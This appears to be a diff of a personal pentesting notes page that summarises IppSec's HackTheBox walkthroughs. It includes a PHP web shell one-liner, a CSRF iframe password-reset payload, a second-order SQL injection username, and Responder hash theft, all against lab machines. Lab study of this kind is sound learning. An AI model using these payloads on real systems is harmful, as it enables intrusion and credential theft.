@@ -743,7 +743,7 @@ the end
 
 <div class="github-dark">
     <pre><code>
-----------------------------[PrivEsc Linux]----------------------------
+----------------------------[PrivEsc Linux TCM]----------------------------
 ++++++++++++ {using LD_PRELOAD} ++++++++++++++
 echo '#include &lt;stdio.h&gt;
 #include &lt;sys/types.h&gt;
@@ -1775,7 +1775,7 @@ req2.send(response);
 
 however, CORS can ruin this if the internal resource you want to access is not in the origin the server sends in its headers in every http request, because when the internal resource domain recieves the request from the domain you are impersonating and sending your request on behalf, the internal resource will check the http header and see that the  origin is not in its range and will return error in the console.
 
-xss - enables you to steal the cookie and access as admin
+[*] xss - enables you to steal the cookie and access as admin
 
 - appended/hidden xss = search for any input that get appended into the html specially into a tags you have to always ask your self when there is input, WHERE MY INPUT GOES ? and inspect the source code
 - converted into html = search for a place where you can input html tags
@@ -1930,7 +1930,7 @@ POST /product?id=-9975 UNION ALL SELECT 77,77,77,CONCAT(0x71706b7671,JSON_ARRAYA
 <div class="github-dark">
     <pre><code>
 -------------------[xxe ]--------------------------------
-XXE - enables you to read files 
+[*] XXE - enables you to read files 
 ------------------------------------------------------------------------------------------------------------
 
 
@@ -2059,7 +2059,7 @@ docker run -it --rm -p 1337:1337 empire
     <pre><code>
 -------------------[Ippsec stacked ]--------------------------------
 Ippsec  htb editorial -
- SSRF  enables you to discover IPv6 of the machine to nmap it and get more services because sometimes you will be lucky and firewall will only be configured ipv4 so scanning IPv6 will reveal more ports
+[*] SSRF  enables you to discover IPv6 of the machine to nmap it and get more services because sometimes you will be lucky and firewall will only be configured ipv4 so scanning IPv6 will reveal more ports
  ...------------------------------------------------------------------------------------------------------------
 
 
@@ -2072,7 +2072,7 @@ Ippsec  htb editorial -
     <pre><code>
 -------------------[Ippsec htb editorial]--------------------------------
 
- SSRF  enables you to discover IPv6 of the machine to nmap it and get more services because sometimes you will be lucky and firewall will only be configured ipv4 so scanning IPv6 will reveal more ports,
+[*] SSRF  enables you to discover IPv6 of the machine to nmap it and get more services because sometimes you will be lucky and firewall will only be configured ipv4 so scanning IPv6 will reveal more ports,
  
 ------------------------------------------------------------------------------------------------------------
 
@@ -2085,7 +2085,7 @@ Ippsec  htb editorial -
 <div class="github-dark">
     <pre><code>
 -------------------[Ippsec stacked ]--------------------------------
-Ippsec stacked - xss can enable you to be like SSRF where you can load some  internal page and send the respond  to your python server, all this if you have xss that makes the web download JavaScripts from you and your JavaScript does this naughty stuff for you and also it would help if you know the specific internal page this is also called CSRF :)
+[*] XSS to SSRF - xss can enable you to be like SSRF where you can load some  internal page and send the respond  to your python server, all this if you have xss that makes the web download JavaScripts from you and your JavaScript does this naughty stuff for you and also it would help if you know the specific internal page this is also called CSRF :)
 
 But you need to be lucky that the other internal site in the same origin, or the origin header is not configured or you bypass the CORS ...
 ------------------------------------------------------------------------------------------------------------
@@ -2315,6 +2315,149 @@ privilege escalation
 if you can run any .py as root you can see the paths that it searches for python3 -c 'import sys; print (sys.path)'
 if there is '' this means the script will first search for the library in the current directory so if you wrote 
 bash .py script with the name of the library you can execute it and get root shell 
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec netmon  ]--------------------------------
+- when ippsec found ftp is on C: he said that this will give him a lot of information about the box like
+batching information of the windows the windows version and any service configurations 
+- ftp - enables you to read web server vulnerable config files or the running services config for passwords
+- that is why he searched for windows LFI directories 
+- c:\windows \panther\unattend\unattended.xml - panther this is the directory where is you do automated
+log files will get put here
+- and old version of windows it would actually put passwords of the default account
+- but doesn't do that anymore it redacts them
+- c:\windows\debug\netsetup.log -  created at install time and will give you who installed it
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec querier  ]--------------------------------
+- ippsec usually do this way of scanning
+- nmap -p- -oN allports.nmap [ip]
+- cat allports.nmap | grep ^[0-9] | awk -F/ '{print $1}' | sort -u > ports
+- for i in $(cat ports); do echo -n $i,; done
+- nmap -sC -sV -p .. [ip]
+- very very interesting and make me feel exploting windows is tricky and smart
+- ippsec logged into mssql using the creds found inside xlsm using oletools
+- when he logged in he executed responder to steal mssql service creds using dir_tree command to lookup
+  for unexisted shared and crack the ntlmv2 hash found in responder
+
+[*] ssql and any service running enable you to execute command - you can steal the service hash using responder to have access
+
+- ippsec showed us the meaning of responder skipping previously captured hash for ..
+- he told us there is a file called ersponder.db which we can sqlite3 responder.db
+- then .scheme to see available tables and then select type,hostname,fullhash from responder; where we can see the hash
+- then he used smbmap -u mssql-svc -p [cracked pass] -d domain -H ip
+- however the ADMIN$ is NO ACCESS
+- he said if we have admin he would use psexec beecause he would be able to drop files into admin
+- the get out for me here is that psexec tool need access to ADMIN$
+- and responder can let you know what the service identitiy name it is running under in windows 
+
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec secnotes  ]--------------------------------
+- this episode is an amazing reference for CSRF of forms
+
+- after ippsec saw the rest password http request in burpsuite and it was without csrf token and there was a form where you can
+contact the admin and the admin in the serverside has scriptt o click on any link sent to him, ippsec tested reseting the password
+multiple times and he doesn't get errors so he started creating the html or the link he wants the admin to visit which is
+his attacker pc and an html link as follows:
+&lt;html&gt;
+  &lt;iframe src=&quot;http://10.10.10.97/change_pass.php?password=PleaseSubscribe&amp;confirm_password=PleaseSubscribe&amp;submit=submit&quot;&gt;&lt;/iframe&gt;
+&lt;/html&gt;
+
+- once he send the admin the link the admin will click it and hence and since he is already logged in the x factor different
+from ippsec account and the admin account is the admin session ! thus once the admin clicks the link ippsec will be using
+the admin's session to perform the action of changing his password because there is no csrf token 
+
+- however he got into an issue where the admin password didn't chagned and that is because he tested with 
+&lt;html&gt;
+  &lt;iframe src=&quot;http://10.10.10.97/test_forward&quot;&gt;&lt;/iframe&gt;
+&lt;/html&gt;
+
+- because he want to check that when the admin clicks on the link and does the frame execute or not but it turns out because it is powershell script it didn't load the 
+iframe so what he does is he just sent the url inside the iframe to the admin instead of the url encapsulated in the html
+
+- he also said something interesting that he would cheeck port 3389 on windows box to know if it is a DC
+
+- also when he saw   Microsoft IIS httpd 10.0
+ he guessed this is windows 2008 or 2016
+
+ also he said when the name of the domain is the same as the name most likely it is not a DC
+
+
+ - when ippsec wanted to make nmap rapidly scan all ports he used the command:
+ nmap -v --max-retries=0 -T5 -p- [ip]
+
+
+ [*] smb - enables you to upload shell and execute it from the normal windows microsoft IIS page if you can access the directory of the page using smb
+ [*] CSRF - enables you to reset user password if there is a way to send the user the link
+ [*] second order sql - enabled you to list admin dashboard in your normal user dashboard
+
+ - so once he got logged in as admin using CSRF he found the admin smb pass to login using smb as admin and created the file
+ <?php system($_REQUEST['ippsec']) ?>
+ so he uploaded it using smb and then access the IIS page with the file name and the parameter to get command execution
+
+ - he check the user and pass using 
+smbmap -u tyler -p 'password' -H [ip]
+ - accessed smb using smbclient -U 'tyler%password' \\\\[ip]\\
+
+ - small note: actually he didn't know there is IIS page however because he accessed smb he found the IIS html page
+ so he did all port scan to find at which port the IIS page is hosted so he can execute his php shell
+ - because ippsec saw bash and itt was helpfull to get privesc I think I will check bash.lnk if i don't have admin or check is there is c:\windows\system32\bash.exe if
+ i can access system32
+ - he also mentioned that you can check where bash is in windows in the path where windows intall the vm or bash
+ c:\users\tyler\appdata\local\packages\Canonical..\localstate\rootfs\root
+- then because he already have the admin smb pass that enabled him to access smb he run 
+psexec.py administrator@10.10.10.97 to get command execution
+- he lastly showed us that inside of trying to get to the admin dashboard using CSRF to get 
+the tyler smb user pass to upload to IIS and get command exectution
+- he just signup with sql injection user which listed all the tyler stuff in the dashboard
+- and this worked because of "second order sql injection" you can watch the video and understand it, it is pretty interesting
+- second order sql is not a direct access to sql but it's pullingit from a tainted resource that then causes the sql injection
+- but in general what i understand is that when i create a user i create username' or 1=1 -- which will be stored as my user because
+the username parameter in the post is user controlable with something like $username = trim($_POST['username']); the trim func will only
+remove white spaces and won't prevent sql injection
+- so in the database the sql injection user will be saved when you login with the sql injection user it will be matched with hex but then the session is set as the username
+- the dashboard will load according to $sql = "SELECT id, title, note, created_at FROM posts WHERE username = '" . $username . "'";
+- and the user is loaded from the session which is sql injection user 
+- second order sql i think even sqlmap will be useless with it
+
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec bounty]--------------------------------
+this episode is very good for the usage of merlin framework c2 for windows
+
+- when ippsec got access to windows he run syysteminfo and when he saw no hotfixes he said it is a fresh install of windows 2008
+  then he saw the build 7600 and said it is not even service pack 1 this is just windows 2008 r2 so
+  whenever that was release everything after that's gonna be vulnerabble so i am guessing things like eternalblue
+  MS16032 but he said ms16032 requires two process to elevate but that system has onlyy 1  process
+- ippsec meentioned what heh doesn't like in merlin is that the powershell modules to be executed it's first 
+pulled from github where HTB boxes doesn't have access to enternet
 ------------------------------------------------------------------------------------------------------------
 
 
